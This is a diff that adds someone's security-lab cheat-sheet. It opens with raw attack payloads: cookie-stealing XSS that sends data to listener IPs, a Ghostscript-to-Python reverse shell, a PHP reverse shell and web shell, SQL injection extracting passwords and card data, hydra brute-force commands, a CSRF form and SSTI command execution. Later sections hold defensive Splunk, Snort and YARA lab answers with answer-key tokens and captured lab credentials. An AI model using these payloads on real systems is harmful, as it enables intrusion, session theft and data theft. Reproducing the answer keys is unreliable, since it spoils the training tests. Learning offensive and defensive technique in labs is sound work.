@@ -1,0 +1,729 @@
+<script> var done = false; window.addEventListener('load', function () { if (!done) { document.getElementById("message").value = document.cookie; document.getElementById("submit").click(); done = true; } }); </script>
+
+
+
+<script>alert(document.cookie)</script>
+
+ <script> function editHeader(){ var ourHeader =  document.getElementById("Header1"); ourHeader.innerHTML = "Defaced"; }</script> 
+
+<h1 id="headertitle">Defaced</h1>
+
+
+GET / HTTP/1.1 Host: 10.102.42.224 
+
+%!PS
+%%BoundingBox: 0 0 74 35
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")') currentdevice putdeviceprops
+
+
+<?php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.102.34.214 ';
+$port = 22;
+$chunk_size = 1400;
+$socket = fsockopen($ip, $port, $errno, $errstr, 30);
+while (true) {
+    $cmd = trim(fgets($socket, $chunk_size));
+    if ($cmd == "quit") {
+        break;
+    }
+    elseif ($cmd == "help") {
+        fwrite($socket, "PHP Reverse Shell Help: \n");
+        fwrite($socket, "Commands:\n");
+        fwrite($socket, "quit - Quit the shell\n");
+        fwrite($socket, "help - This menu\n\n");
+    }
+    else {
+        $output = shell_exec($cmd);
+        fwrite($socket, $output . "\n");
+    }
+}
+fclose($socket);
+
+=================================================================
+
+
+***hydra -l rupert -P /usr/share/wordlists/rockyou.txt -s 12345 -f 10.102.38.233  http-get /admin***
+
+hydra -t 5 -V -l rupert -P /usr/share/wordlists/rockyou.txt 10.102.7.13 http -s 12345 
+
+http-post-form "login.php:username=^rupert^&password=^PASS^&Login=Login:Login failed" -V
+
+
+hydra -l rupert -P /usr/share/wordlists/rockyou.txt -s 12345 -f 10.102.38.233  http-get "/:username=^cnVwZXJ0OnBhc3N3b3Jk^&password=^PASS^&Login=Login:cnVwZXJ0OnBhc3N3b3Jk and/or password incorrect /admin"
+
+=================================================================
+Basic auth http
+GET /lookup?url=file:///tmp/token.txt HTTP/1.1
+
+=================================================================================
+
+UNION SELECT passwd, null, null, null FROM users_private WHERE username = CONCAT(CHAR(65), CHAR(108), CHAR(105), CHAR(99), CHAR(101))
+
+===================================================================================
+Stored xss (Paste into web form)
+<script> document.getElementById("your element id here").innerHTML = "New text!"; </script> 
+
+Reflected xss (Paste into URL after id=)
+TargetIP/purchase?id=<script>console.log(yourtext)</script>
+
+======================================================================================
+
+10.5.9-MariaDB (Current DB Software)
+
+'union select @@version,2,3 from information_schema.tables# (Name of current DB)
+
+3 UNION SELECT passwd, null, null, null FROM users_private WHERE username = CONCAT(CHAR(65), CHAR(108), CHAR(105), CHAR(99), CHAR(101))
+
+SELECT id, first_name FROM users_table WHERE id = -1 UNION SELECT username, null FROM private_table WHERE username = 'John'
+
+' UNION SELECT 1,group_concat(column_name, 0x0a),3 FROM information_schema.columns WHERE table_name="customers"#
+
+Union select id, full_name, address, phone_number, card_num, exp_date, null FROM private_data#
+
+Razzmatazz' UNION SELECT phone_number FROM private_data WHERE full_name = 'Ronan Hunter' #' 
+
+dante'  Union select id, full_name, address, phone_number, card_num, exp_date, null FROM private_data# (Will return all the answers)
+
+-1 UNION SELECT passwd, null FROM users_private WHERE username = CONCAT(CHAR(65), CHAR(108), CHAR(105), CHAR(99), CHAR(101)) (Will return Alices,Jane,james PW with ASCii Concat)
+
+
+
+'uNION sELECT password fROM users'  
+
+'uNION sELECT lastLogIn fROM TABLE_NAME=users wHere username=mostwizard'
+
+=====================================================================================
+
+python3 -m http.server 80 (Basic http server)
+
+<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
+
+nc -lvp 444
+
+<ScRipT>var i=new Image;i.src="http://10.102.56.218:80/?"+document.cookie;</ScRipT>
+
+<ScRiPt>window.location=http://10.102.56.218:80/?cookie='+document.cookie</ScRipT><a href=[LINK]</a>
+
+<script>var i=new Image;i.src="http://10.102.56.218:8o/?"+document.cookie;</script>
+
+<img src=x onerror=this.src='http://10.102.56.218:8o/?'+document.cookie;>
+
+<img src=x onerror="this.src='http://10.102.56.218:8o/?'+document.cookie; this.removeAttribute('onerror');">
+
+<script>document.write('<img src="http://10.102.56.218:8o/?c='+document.cookie+'" />');</script>
+
+
+<IMG """<SCRIPT>var i=new Image;i.src="http://10.102.56.218:8000/?"+document.cookie;</SCRIPT>
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+
+<form action="http://10.102.52.91" method="POST">
+
+<input type="hidden" name="acct" value="MARIA"/>
+<input type="hidden" name="amount" value="100000"/>
+<input type="submit" value="View my pictures"/>
+
+</form>
+
+ Found this picture of you!! <a href="<ScRipT>var i=new Image;i.src=http://10.102.7.118:80/?+document.cookie;</ScRipT>">[LINK]</a>
+
+Superman kicks a bear <a href="http://10.102.21.246:80/var i=new Image;i.src=http://10.102.21.246:80/?+document.cookie;</ScRipT>">[LINK]</a>
+
+Superman kicks a bear <a href="http://Superman kicks a bear <a href="http://targetipaddress/somepayload">[LINK]</a>/somepayload">[LINK]</a>
+
+
+Superman kicks a bear <a href="http://10.102.21.246:80/somepayload">[LINK]</a>
+
+
+
+Stuart is trying to craft a decent payload, have a look at the link! <a href="http://10.102.21.246//index.php?post=Submit+Query HTTP/1.1">[LINK]</a>
+
+c5e3abfba3ca2cafcdcf447c0dbc4d3c
+
+======================================================================================
+
+<?php
+echo "/n" . file_get_contents("/tmp/token.txt");  (PHP Shell)
+?>
+
+=====================================================================================
+
+or = ||
+
+udp.srcport == 53 || udp.srcport == 59015 || udp.srcport == 63518 
+
+udp.dstport == 59485 || ip == 10.6.5.102
+
+(http.request || ssl.handshake.type == 1 || tcp.flags eq 0x0002) and! (tcp.port eq 25) 
+
+(http.request || ssl.handshake.type == 1 || tcp.flags eq 0x0002 || dns) and! (tcp.port eq 25) 
+
+ip.src == 185.236.202.244 || ip.dst == 10.1.10.101 && tcp.dstport == 443
+
+====================================================================================
+
+md5sum /home/forensics/Desktop/labfiles/show_ads.js
+
+tshark -r tsharklab.pcap
+
+http.request.method == "POST"
+
+nbns
+
+- To get windows username, drill down into catagories in middle pane
+Kerberos.cnamestring
+
+===================================================================================
+- Yara file
+
+rule malware_family {
+    meta:
+        description = "Identifies a suspected malware family"
+    strings:
+        $string1 = "malware_family_string_1"
+        $string2 = "malware_family_string_2"
+        $pattern1 = { 4D 5A 90 00 03 00 00 00 }
+    condition:
+        all of ($string*) or $pattern1
+}
+
+strings 1.bin bin1out
+
+yara my_rule.yar 1.yar
+
+strings 1.bin
+
+xxd 1.bin
+
+=======================================================
+
+rule ScanningFiles {
+    meta:
+        description = "Comprehensive YARA scanning file"
+    strings:
+        $string1 = "unique string 1"
+        $string2 = "unique string 2"
+        $string3 = "unique string 3"
+    condition:
+        all of them
+}
+
+rule ExcludeLegitimateFiles {
+    meta:
+        description = "Exclude legitimate files from scanning"
+    strings:
+        $legit_string1 = "legitimate string 1"
+        $legit_string2 = "legitimate string 2"
+    condition:
+        not ($legit_string1 or $legit_string2)
+}
+
+rule ExcludeUnrelatedFiles {
+    meta:
+        description = "Exclude unrelated files from scanning"
+    strings:
+        $unrelated_string = "unrelated string"
+    condition:
+        not $unrelated_string
+}
+
+
+===========================================================================
+Splunk ep:3
+
+Perform a search for the domain “imreallynotbatman.com”. How many events are returned?
+
+	imreallynotbatman.com 
+	| stats count
+
+Perform a search for the domain “imreallynotbatman.com”, this time including the field "http_method=POST". How many events are returned?
+
+	imreallynotbatman.com http_method "http_method"=POST
+
+Perform a search for the domain “imreallynotbatman.com”, this time including the field "http_method=POST" and the field "status=500". How many events are returned?
+
+	imreallynotbatman.com "http_method"=POST status=500
+
+Expand the search query from the previous question to also include all "status=4*" results. How many events are returned?
+
+	imreallynotbatman.com http_method=POST status=500 OR status=4*
+
+Perform a search for the filepath "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp". How many events does it appear in?
+
+	index=* \\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp | stats count
+
+===============
+Splunk ep:4
+
+Perform a search that lists the most common (top) “http_method” field values from the index “botsv1”. What percentage is given for the most common http_method present in the dataset?
+
+	index="botsv1" "http_method"
+
+Perform a search that lists only the least common (rare) “status” field value from the index “botsv1”. What is the status code given?
+
+	index="botsv1" | rare limit=20 status
+
+Perform a search using the stats command to count the number of events present by the field 'EventID' from the Source 'WinEventLog:Microsoft-Windows-Sysmon/Operational'. What is the EventID with the second most events?
+
+	source=WinEventLog:Microsoft-Windows-Sysmon/Operational EventID=3 | stats  count
+
+Perform a search for the domain “imreallynotbatman.com” and then use the 'top' command to determine the IP address of an attacker scanning the domain mentioned above for web app vulnerabilities (i.e., the 'top' 'src_ip').
+
+	imreallynotbatman.com | top limit=20 src_ip
+
+Perform a search using the domain and IP address from the previous question. What is the top 'alert.signature' field value reference?
+
+	
+
+Using the previously discovered ‘attacker IP’, determine the IP address of the web server being targeted by incoming attacker activity.
+
+	src_ip=40.80.148.42 dest_ip="192.168.250.70"
+
+HTTP Status Codes Breakdown
+	index=botsv1 source="stream:http" | top limit=10 status | fields - percent
+Web Activity by IP
+	index=botsv1 source="stream:http" | stats count by src_ip | sort - count
+IP Activity by HTTP Method
+	index=botsv1 source="stream:http" | chart count over src_ip by http_method
+
+=========
+Splunk Malicious account analysis
+
+What was the username of the unauthorised account from the Linux logs?
+
+	****secretroot****
+
+What group was the unauthorised Linux user added to?
+
+	****sudo**** (source="/var/log/auth.log"  "name=secretroot" , click on arrow in event and expand, click in event actions, and select show source)
+
+Was the user identified in the previous question able to log in to the box?
+
+	****No****
+
+Which IP address is the unauthorised account connecting from?
+
+=========
+Demonstrate skill
+
+Search for the host we8105desk, source WinEventLog:Microsoft-Windows-Sysmon/Operational, and the 192.168.250.20 DestinationIp. How many events are returned?
+
+	we8105desk source="WinEventLog:Microsoft-Windows-Sysmon/Operational" DestinationIp="192.168.250.20"
+
+Looking at the results from the previous question, find the host name of the remote server. What is the DestinationHostname?
+
+	we8105desk source="WinEventLog:Microsoft-Windows-Sysmon/Operational" DestinationIp="192.168.250.20" DestinationHostname
+
+Search for the keyword “cerber” using the Suricata sourcetype and count the results by the fields alert.signature and alert.signature_id. What is the signature_id of the alert that appeared the fewest times?
+
+	cerber sourcetype=suricata "alert.signature"="*" "alert.signature_id"="*"  "alert.signature_id"
+
+
+=============================================================================================================
+Snort Ep1
+
+***********************https://cyberwarzone.com/snort-rule-generator-online/**************************
+
+Create a Snort rule that will alert on traffic using TCP with a destination port of 443. Validate the rule in the PCAP scanner and enter the token.
+
+	alert tcp any any -> any 443 (msg: "Testing Alert" ; sid:1000002)
+
+What is the name of the content modifier that can be used to alert on HTTP Status Codes?
+
+	****http_stat_code***
+
+What is the token generated when you create a Snort rule that will detect outbound traffic using TCP to ports 443 and 447?
+
+	alert tcp any any -> any 443,447 (msg:"Traffic on ports 443 and 447"; sid:1000001; rev:1;)
+
+What is the token generated when you create a Snort rule that will detect all ICMP traffic?
+
+	alert icmp any any -> any any (msg: "Testing Alert" ; sid:1000001)
+
+Modify this rule, so that it only alerts if the content matches in the first three bytes: 'alert tcp any any -> any any (msg:"Immersive Labs Question 5"; content:"|37 e1 a4|"; sid:1000001;)', then enter the token that is generated.
+
+	alert tcp any any -> any any (msg:"Immersive Labs Question 5"; content:"|37 e1 a4|"; depth: 3; sid:1000001;)
+
+================
+Snort Ep2 DNS
+
+Create a Snort rule to detect all DNS Traffic, then test the rule with the scanner and submit the token.
+
+	alert udp any any <> any 53 (msg: "Testing Alert" ; sid:1000001)
+
+Create a rule to detect DNS requests to 'icanhazip', then test the rule with the scanner and submit the token.
+
+	alert udp any any -> $HOME_NET 53 (msg: "Alert"; sid:1000001; content: "|69 63 61 6e 68 61 7a 69 70|"; )
+
+Create a rule to detect DNS requests to 'interbanx', then test the rule with the scanner and submit the token.
+
+	alert udp any any -> $HOME_NET 53 (msg: "Alert"; sid:1000001; content: "|69 6e 74 65 72 62 61 6e 78|"; )
+
+The value "0377777706676f6f676c6503636f6d00" appears to be a hexadecimal representation of ASCII characters. Let's decode it:
+
+"03777777": Decodes to "www", representing the hostname or domain name.
+"066f6f676c65": Decodes to "foo", representing a portion of the URL or a parameter.
+"03636f6d00": Decodes to "com", representing the top-level domain.
+Putting it all together, the decoded value is "www.foo.com".
+
+==============
+Snort Ep3 HTTP
+
+Create a Snort rule that looks for ‘msn.com’ in an HTTP cookie value. Test the rule and enter the token.
+
+	alert tcp any any -> any any (msg: "msn.com in cookie"; content: "|6d 73 6e 2e 63 6f 6d|"; http_cookie; sid:1000001;)			
+
+Create a Snort rule that looks for an HTTP method ‘GET’ and contains ‘gif’ in the URL. Test the rule and enter the token.
+
+	alert tcp any any -> any any (msg: "HTTP GET request with 'gif' in URL"; \
+    flow:to_server,established; \
+    content: "GET"; http_method; \
+    pcre: "/GET\s\S*\.gif/i"; \
+    sid: 1000007;)
+
+Create a rule that will alert when 'MZ' are first two characters in the HTTP body. Test the rule and enter the token.
+
+	alert tcp any any -> any any (msg: "alert MZ first 2 chars in HTTP Body"; file_data; content:"MZ"; depth: 2; sid:1000001;)
+
+If you wanted a rule to match on a URI string that has been URI decoded, which modifier would you use?
+
+	*****http_uri*******
+
+=============
+Snort Ep4 SMTP
+
+What is the maximum size of Base64 data that can be decoded?
+
+	****65535****
+
+Create a Snort rule that looks for 'REMITTANCE ADVICE' in an SMTP Subject line. Test the rule and enter the token.
+
+	alert tcp any any -> any 25 (msg: "SMTP Subject contains 'REMITTANCE ADVICE'"; \
+    flow:to_server,established; \
+    content:"Subject: REMITTANCE ADVICE"; nocase; \
+    sid:1000010;)
+
+Create a Snort rule that looks for '@gmail.com'. Test the rule and enter the token. This rule is required to answer the next question.
+
+	alert tcp any any -> any 25 (msg: "SMTP Traffic contains '@gmail.com'"; \
+    flow:to_server,established; \
+    content:"@gmail.com"; nocase; \
+    sid:1000013;)
+	
+What is the full timestamp of the first packet identified after submitting the previous rule?
+
+	******2018-06-08T09:06:19.092617******
+
+After submitting the previous rule, which port does the source IP address use?
+
+	******40694*****
+
+
+
+Create a Snort rule that looks for the email from 'catch-all@star-labs.co.uk' and enter the token. This rule is required to answer the next question.
+
+	alert tcp any any -> any 25 (msg: "Email from 'catch-all@star-labs.co.uk'"; \
+    flow:to_server,established; \
+    content: "MAIL FROM:<catch-all@star-labs.co.uk>"; nocase; \
+    sid: 1000012;)
+
+
+============
+Snort Ep5 Fake Techsupport popup
+
+What is the IP address hosting the Fake Anti-virus?
+
+	*****68.183.175.204****  (Analyse PCAP file for suspicious GET request)
+
+Create a Snort rule to detect connections to this IP address from 10.1.9.101 on port 49349, then submit the token.
+
+	alert tcp 10.1.9.101 49349 -> 68.183.175.204 any (msg: "Connection to 68.183.175.204 from 10.1.9.101 on port 49349"; \
+    sid: 1000014;)
+
+Create a Snort rule to detect the GET request to the 'pc-error-0xxxfrxx88' page from the port 49346, then submit the token.
+
+	alert tcp any 49346 -> any any (msg:"GET request to pc-error-0xxxfrxx88 page"; flow:to_server,established; content:"GET"; http_method; content:"Host|3a|"; http_header; content:"pc-error-0xxxfrxx88"; http_uri; sid:1000001; rev:1;)	
+
+
+Create a Snort rule to detect the domain 'site.topwebsite4.xyz', then submit the token.
+
+	alert tcp any any -> any any (msg: "Domain 'site.topwebsite4.xyz' detected"; \
+    content: "site.topwebsite4.xyz"; \
+    sid: 1000022;)
+
+Based on your previous rule, which port did the source IP address use in the second packet?
+
+	******49342****
+
+Rewrite this rule so it only looks for packets using the port number from activity 8 and the domain name from activity 7
+
+	alert tcp any 49342 -> any any (msg: "Domain 'site.topwebsite4.xyz' detected"; \
+    content: "site.topwebsite4.xyz"; \
+    sid: 1000022;)
+	
+
+Create a Snort rule to detect the GET request to the 'defender.png' file, then submit the token.
+
+	alert tcp any any -> any any (msg:"GET request to defender.png file"; flow:to_server,established; content:"GET"; http_method; content:"Host|3a|"; http_header; content:"/defender.png"; http_uri; sid:1000002; rev:1;)
+
+What is the full timestamp of the packet detected using the previous rule?
+
+	****2019-01-09T18:06:55.922361*******	
+
+Which port was used by the source IP address of the packet detected using the previous rule?
+
+	****49346****
+
+
+============
+Snort Ep6 Credential stealer via FTP
+
+
+Analyze the HTTP traffic – what is the name of the malicious executable file that has been requested?
+
+	*****AL5THvvehvvvajyc.exe******* (Analyse PCAP, filter HTTP (GET))
+
+What is the hostname this request has been made to?
+
+	*****Microflash.no***** (Drill down into HTTP tab in middle pane)
+
+Create a Snort rule to detect the GET request of this file, then submit the token.
+
+	alert tcp any any -> any 80 (msg:"AL5THvvehvvvajyc.exe GET request detected"; content:"AL5THvvehvvvajyc.exe"; sid:1000; rev:1;)
+
+What is the IP address the request has been made to?
+
+	******205.186.187.108******	
+
+Analyze the FTP traffic – what is the user name requested from the IP address 89.46.222.42?
+
+	**********admin_szafhhjjk********** (Search FTP in PCAP file)
+
+
+Create a Snort rule to detect this username using the source port 49163, then submit the token.
+
+	alert tcp any 49163 -> any any (msg:"Detect username admin_szafhhjjk from source port 49163"; flow:established; content:"admin_szafhhjjk"; sid:1000005; rev:1;)
+
+
+What is the password requested from the same IP address?
+
+	*****z3N9yLo6Qet***** (Same as above)
+
+
+Create a Snort rule to detect this password using the source port 49168, then submit the token.
+
+	alert tcp any 49168 -> any any (msg:"Detect password z3N9yLo6Qet from source port 49168"; flow:established; content:"z3N9yLo6Qet"; sid:1000005; rev:1;)
+
+
+Create a Snort rule to detect all packets to the domain 'checkip.amazonaws.com' and the IP address 52.202.139.131, then submit the token.
+
+	alert tcp any any -> any any (msg:"Detect packets to checkip.amazonaws.com"; content:"Host: checkip.amazonaws.com"; sid:1000001; rev:1;)
+
+	
+Create a Snort rule to detect the HTTP status code '200' for connections from the previous IP address, then submit the token.
+
+	alert tcp 52.202.139.131 any -> any any (msg:"HTTP status code 200 from 52.202.139.131"; content:"HTTP/1.1 200"; sid:1000005; rev:1;)
+
+
+
+===============
+Snort Ep7 
+
+Analyze the PCAP file – which domain is the malware communicating to?
+
+	******atelierdodoce.com.br*********
+
+Create a Snort rule to detect packets from the IP address 10.3.15.103 using the port number 49160 to this domain, then submit the token.
+
+	alert tcp 10.3.15.103 49160 -> any any (msg:"Detect packets to atelierdodoce"; content:"atelierdodoce"; nocase; sid:1000001;)
+
+After submitting the previous rule, what is the destination IP address?
+	
+	****158.69.161.76****
+
+Create a Snort rule to detect all connections in relation to this IP address where the HTTP status code is 200, then submit the token.
+
+	alert tcp 158.69.161.76 any -> any any (msg:"HTTP status code 200 from 158.69.161.76"; content:"HTTP/1.1 200"; sid:1000005; rev:1;)
+
+Create a Snort rule to detect the HTTP status code 404
+	
+	alert tcp any any -> any any (msg:"HTTP 404 Status Code Detected"; content:"HTTP/1.1 404"; sid:1000001; rev:1;)
+
+What is the full timestamp of the second packet identified?
+
+	****2019-03-15T18:41:40.446096*****
+
+Analyze the HTTP traffic and identify the request URI – what PHP file is being used?
+
+	****fre.php**** (Search HTTP in PCAP file, and look for PHP files)
+
+Create a Snort rule to detect any connections using the port 49164 where the request URI contains this file, then submit the token.
+
+	alert tcp any 49164 -> any any (msg:"URI contains fre.php"; flow:to_server,established; content:"POST"; http_method; content:"/fre.php"; http_uri; sid:1000001;)
+
+Analyze the HTTP traffic – what is the User-Agent string?
+
+	****Mozilla/4.08 (Charon; Inferno)**** (Select POST request from 158.69.161.79 and follow HTTP)
+
+Create a Snort rule to detect this User-Agent string in the HTTP header for connections using port 49167, then submit the token.
+
+alert tcp any 49167 -> any any (msg:"Detect User-Agent Mozilla/4.08"; content:"User-Agent: Mozilla/4.08"; http_header; sid:1000001; rev:1;)	
+
+==========================
+Snort Ep8 Emotet and Trickbot
+
+What is the name of the file contained within the zipped attachment in the first GET response?
+
+	****392578042401_Apr_29_2019.doc*** (Use http.response command in wireshark)
+
+Identify the first POST request from the host 'MARY-WINDOWS-PC' – what is the User-Agent used in this packet?
+
+	****test**** (Use http.request and search for 1st POST)
+
+What is the user's email address?
+
+	****mary.parkerson222@gmail.com**** (http.request then Follow TCP on POSTs)
+
+What is the user's password?
+
+	****P@ssw0rd$**** (http.request then Follow TCP on POSTs)
+
+Create a Snort rule to detect connections from the IP address 165.73.140.15 with the HTTP status 200, then submit the token.
+
+	alert tcp 165.73.140.15 any -> any any (msg:"HTTP status code 200 from 165.73.140.15"; content:"HTTP/1.1 200"; sid:1000005; rev:1;)
+
+Create a Snort rule to detect the user's email address, then submit the token.
+
+	alert tcp any any -> any any (msg:"Detect user email address"; content:"mary.parkerson222@gmail.com"; nocase; pcre:"/[\w\.-]+@[\w\.-]+\.\w+/"; sid:1000001; rev:1;)
+
+Create a Snort rule to detect the user's password, then submit the token.
+
+	alert tcp any any -> any any (msg:"Detect user password"; content:"P@ssw0rd$"; sid:1000001; rev:1;)
+
+Create a Snort rule to detect POST requests from the IP address 10.4.29.101 using port 49246 communicating to 75.183.130.158 using port 8082, then submit the token.
+
+	alert tcp 10.4.29.101 49246 -> 75.183.130.158 8082 (msg:"POST request from 10.4.29.101 49246"; flow:to_server,established; content:"POST"; nocase; sid:1000001; rev:1;)
+
+	
+
+Create a Snort rule to detect the destination IP address and domain used in the second GET request, then submit the token
+
+	alert tcp any any -> 192.185.50.170 any (msg:"Detect destination IP and domain"; content:"GET /temp/xlbb/"; nocase; sid:1000001; rev:1;)
+
+Create a Snort rule to detect connections using the 'test' user-agent, then submit the token.
+
+	alert tcp any any -> any any (msg:"Connection using 'test' User-Agent"; flow:established,to_server; content:"User-Agent\: test"; nocase; sid:1000001; rev:1;)
+
+
+
+alert ip 10.3.16.101 49309 -> 85.17.197.100 80 (msg:"Ack"; flow:established,to_server; content:"GET"; nocase; http_method; sid:1000001; rev:1;)
+
+
+
+==============================
+Snort Ep9 
+
+What is the full request URI of the first GET request in the first PCAP file?
+
+	****http://neighbor.onegooglechecksim.xyz/eesti-amatoare-neighbor**** (Expand centre pane on Hypertext Transfer Protocol and look for Full URI)
+
+What is the full request URI of the first GET request in the second PCAP file?
+
+	http://chichi.onegoogledeleterent.xyz/pantera-classic-chichi (same as above)
+
+What is the full request URI of the first GET request in the third PCAP file?
+
+	http://lot.onegooglechecksim.xyz/holiday-titanime-lot (same as above)
+
+==========================
+Snort Ep10
+
+Analyze the 'Apprentice.pcap' file. What is the destination IP address of the first TCP packet?
+
+	****3.19.3.150****
+
+Analyze the 'Master.pcap' file. What is the string value within the member key 'city' of the JSON Object?
+
+	****Baton Rouge**** (File,Export Objects,HTTP, locate .json file and search middle pane)
+
+Create a Snort rule to detect any POST requests to the IP address from question 4, then submit the token.
+
+	alert tcp any any -> 3.19.3.150 any (msg:"POST Request to 3.19.3.150"; flow:to_server,established; content:"POST"; http_method; sid:1000001; rev:1;)
+
+Identify the suspicious domain that appears in both PCAP files. Create a Snort Rule to detect packets using this domain from the IP address in question 4, then submit the token.
+
+	alert tcp 3.19.3.150 any -> any any (msg:"Domain ngrok.io detected"; content:"ngrok.io"; nocase; sid:1000001; rev:1;)
+
+Create a Snort rule to detect the GET request to the Shockwave Flash file in 'Apprentice.pcap', then submit the token.
+
+	alert tcp any any -> any any (msg:"Detect GET request to Shockwave Flash file"; flow:established, to_server; content:"GET"; nocase; content:".swf"; nocase; sid:1000001;)
+
+Create a Snort rule to detect the HTTP status code '302' from the IP address '3.14.212.173', then submit the token.
+
+	alert tcp 3.14.212.173 any -> any any (msg:"HTTP status code 302 from 3.14.212.173"; content:"HTTP/1.1 302"; sid:1000005; rev:1;)	
+
+Create a Snort rule to detect the GET request to the Shockwave Flash file in 'Master.pcap', then submit the token.
+
+	alert tcp any any -> any any (msg:"Detect GET request to Shockwave Flash file"; flow:established, to_server; content:"GET"; nocase; content:".swf"; nocase; sid:1000001;)
+
+Analyze 'Master.pcap'. Which file is called in the last GET request?
+
+	****Server.exe**** (http.request, navigate to last GET request)
+
+Identify the packet where 'u2cw.exe' appears in 'Master.pcap'. Create a Snort rule to detect this file, then submit the token.
+
+	alert tcp any any -> any any (msg:"File u2cw.exe detected"; content:"u2cw.exe"; nocase; sid:1000001; rev:1;)
+
+Analyze 'Apprentice.pcap' and identify the packet where the file from question 11 appears. Create a Snort rule to detect this file, then submit the token.
+
+	alert tcp any any -> any any (msg:"File server.exe detected"; content:"|53 45 52 56 45 52 2E 45 58 45|"; nocase; sid:1000001; rev:1;)
+
+=========================
+Spelevo Exploit Kit
+
+
+Using the PCAP file, what IP address does copii.whatgoogle.xyz resolve to?
+
+	****85.17.197.100**** (Check DNS response (2nd entry) and in middle pane select DNS near bottom)
+
+Create a Snort rule to detect both the DNS request and response for 'copii.whatgoogle.xyz'. Test the rule and enter the token.
+
+	alert udp any any -> any any (msg: "Testing Alert" ; content: "xyz"; nocase; sid:1000001;)
+
+How many GET requests are made to copii.whatgoogle.xyz?
+
+	****3****
+
+Create a Snort rule to detect a GET request to 'copii.whatgoogle.xyz'. Test the rule and enter the token. 	
+
+	alert tcp any any -> any any (msg:"Detecting GET request to copii.whatgoogle.xyz"; flow:to_server,established; content:"GET"; nocase; http_method; content:"copii.whatgoogle.xyz"; sid:1000002)
+
+What is the Content-Type for the exploit payload that is delivered in the GET request ending in 00sw?
+
+	****Application/x-shockwave-flash****	
+
+Create a Snort rule to detect the file type in the previous question. Test the rule and enter the token.
+
+	alert tcp any any -> (msg:"Detecting application/x-shockwave-flash file type"; content:"Content-Type|3a| application/x-shockwave-flash"; nocase; sid:1000001;)
+
+Decode the Base64 string that is assigned to "var p"; what is the version number for PluginDetect?
+
+	****0.9.1*** (echo 'string' | base64 -d)
+
+
+
+
+			1		  367
+{{''.__class__.__mro__[1].__subclasses__()[367]('cat /tmp/token.txt' , shell=True, stdout=1).communicate()[0].strip() }}
+
+{{''.__class__.__mro__[2].__subclasses__()[40]('cat /tmp/token.txt').read()}}
+
+
